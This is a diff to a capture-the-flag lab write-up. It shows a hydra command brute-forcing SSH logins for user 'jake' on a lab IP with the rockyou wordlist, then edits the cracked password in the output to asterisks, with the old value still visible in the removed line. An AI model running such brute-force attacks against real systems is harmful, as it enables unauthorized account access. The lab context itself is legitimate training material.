@@ -51,7 +51,7 @@ hydra -l jake -P /usr/share/wordlists/rockyou.txt  10.10.15.26  ssh -t 4
 ```  
 we used **jake** as the user and used argument **-P** to specify our world list with out IP and port we are attacking which is **ssh** 
 ``` bash
-host: 10.10.15.26   login: jake   password: 987654321
+host: 10.10.15.26   login: jake   password: **********
 ```  
 Oh dear jake u failed us hope this wont let me in .  
 ```ssh jake@'ur_ip_here'```  
